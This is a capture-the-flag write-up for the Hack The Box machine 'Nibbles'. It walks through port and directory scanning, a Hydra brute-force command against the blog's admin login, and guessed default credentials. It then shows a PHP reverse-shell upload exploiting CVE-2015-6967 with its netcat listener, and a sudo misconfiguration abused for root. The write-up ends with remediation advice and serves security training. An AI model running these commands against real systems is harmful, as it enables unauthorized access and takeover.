+++
draft = false
date = 2020-06-19T16:04:02+01:00
title = "Nibbles"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 5

+++


# Machine info

- OS : Linux
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.75


# Mind Map
![Nibbles_MindMap](/images/htb/nibbles_mindmap.png)


# Reconnaisance

I start with a scan to check for open ports:

{{< highlight html >}}
sudo nmap -sT -sV -n 10.10.10.75 -oA nmap/sT_SV_scan
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 10:32 BST
Nmap scan report for 10.10.10.75
Host is up (0.097s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
{{< /highlight >}}
**Note**: A full port scan does not reveal any new open port.

I have only port 22 and port 80 open, so let's start with the enumeration phase.

# Enumeration

I proceed visiting the webpage at `10.10.10.75:80`. It shows nothing apart from a "Hello World" message, but visiting the source code I can see a reference to a resource:

{{< highlight bash >}}
<b>Hello world!</b>


<!-- /nibbleblog/ directory. Nothing interesting here! -->
{{< /highlight >}}

Visiting `10.10.10.75:80/nibbleblog/` I am presented with a **Nibbleblog** blog homepage:

![Nibbles_Blog](/images/htb/nibbles_blog.png)

At this point - as the links in the page do not show anything useful - I want to check if there are open directories available on the web server. I mostly like `dirsearch` for this purpose:

{{< highlight html >}}
sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.75:80/nibbleblog/ -e php,bak,old,sh
{{< /highlight >}}
Where:
- `-e` is for telling the command what extensions to search for

I'm able to found something interesting here: a `README` page and a a link to an `Admin login` page.

{{< highlight html >}}
[11:19:28] 200 -    1KB - /nibbleblog/admin.php
[11:19:29] 200 -    2KB - /nibbleblog/admin/
[11:19:29] 403 -  312B  - /nibbleblog/admin/.htaccess
[11:19:29] 200 -    2KB - /nibbleblog/admin/?/login
[11:19:30] 301 -  332B  - /nibbleblog/admin/js/tinymce  ->  http://10.10.10.75/nibbleblog/admin/js/tinymce/
[11:19:30] 200 -    2KB - /nibbleblog/admin/js/tinymce/
[11:19:52] 301 -  323B  - /nibbleblog/content  ->  http://10.10.10.75/nibbleblog/content/                         
[11:20:04] 200 -    3KB - /nibbleblog/index.php                                                                
[11:20:04] 200 -    3KB - /nibbleblog/index.php/login/
[11:20:05] 200 -   78B  - /nibbleblog/install.php
[11:20:21] 200 -    5KB - /nibbleblog/README
{{< /highlight >}}

The `README` file informs about the **Nibbleblog** version. It can be useful for searching for any known vulnerability.

{{< highlight html >}}
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
{{< /highlight >}}

Indeed, version  4.0.3 seems vulnerable to `CVE-2015-6967`:

> Unrestricted file upload vulnerability in the My Image plugin in Nibbleblog before 4.0.5 allows remote administrators to execute arbitrary code by uploading a file with an executable extension, then accessing it via a direct request to the file in content/private/plugins/my_image/image.php.

# Exploitation

I first need to figure out how to enter the administrator panel for uploading a file.
Here is the Admin login page:

![Nibbles_Login](/images/htb/nibbles_login.png)

Let's try to brute force the login with **Hydra**:

{{< highlight html >}}
hydra -V -f -t 4 -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^&Login=Login:Incorrect username or password."
{{< /highlight >}}

Where:

- `-V` is for verbosity
- `-f` exits when a successful login is found
- `-t` number of connects in parallel per target
- `username` and `password` are the fields to bruteforce
- `Incorrect username or password` is the message printed on screen when the login fails

I get some false positives and the attempt to bruteforce the login blocks my ip :(
I have to wait a few minutes for being able to visit the login page again! The solution here appears to be really simple, I just have to try some basic user/pass combinations like `admin/admin`, `admin/password`, `admin/nibbles`. The last one works!

Once I'm in, I have to upload a file of my choice under `Plugins -> My image`. I download a `php-reverse-shell` from Pentestmonkey and edit it with the IP/PORT couple of my machine before uploading the file.

Then I have to set up a netcat listener to receive the connection back and visit the following link (which hosts the reverse shell):

{{< highlight html >}}
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
{{< /highlight >}}

I receive a connection back and I'm logged in as the `nibbler` user!

{{< highlight html >}}
nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.75] 59652
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 11:37:54 up  6:14,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
{{< /highlight >}}


# Privilege escalation

To have a Python interactive shell:

{{< highlight html >}}
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/home/nibbler$
{{< /highlight >}}

For privilege escalation I like using this great tool called **Linux Smart Enumeration**. You can find it on GitHub: https://github.com/diego-treitos/linux-smart-enumeration

I download the script on the target machine and launch it with the following command:

{{< highlight html >}}
./lse.sh -l 1 -i
{{< /highlight >}}
Where:
- `-l` specifies the 'verbosity' of the command
- `-i` is for telling the command to not ask the current user password

Then I check the scritp results for interesting informations about the machine:

{{< highlight html >}}
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
{{< /highlight >}}

I'm able to run the `/home/nibbler/personal/stuff/monitor.sh` script with sudo permissions without providing a password!
The content of the `personal` directory is zipped. I have two options here:

1. unzip the file and edit `monitor.sh`
2. as I have write permissions under `/home/nibbler`, I can create my own `monitor.sh` script under the specified path

I choose the second one! All I have to do is to create a script named `monitor.sh` with the following content:

{{< highlight html >}}
#!bin/sh

bash
{{< /highlight >}}

And make it executable:

{{< highlight bash >}}
chmod +x monitor.sh
{{< /highlight >}}

Launching the script with sudo gives me root permissions!

{{< highlight html >}}
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
/home/nibbler/personal/stuff/monitor.sh: 1: /home/nibbler/personal/stuff/monitor.sh: !#bin/sh: not found
root@Nibbles:/home/nibbler/personal/stuff# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Nibbles:/home/nibbler/personal/stuff#
{{< /highlight>}}

**Note**: as always, flags are under `/home` and `/root`, but I suppose we don't really care about that!

## Lessons learned and remediations

- Always try first simple user/passwords combinations before attempting to brute force a login, so to avoid ending up in a blacklist.
- The admin panel credentials were too easy to guess, so never use weak authentication credentials.
- The blog is using a known vulnerable application, so always patch your software where possible.
- The system admin should have not given a regular user the ability to run a script as root!
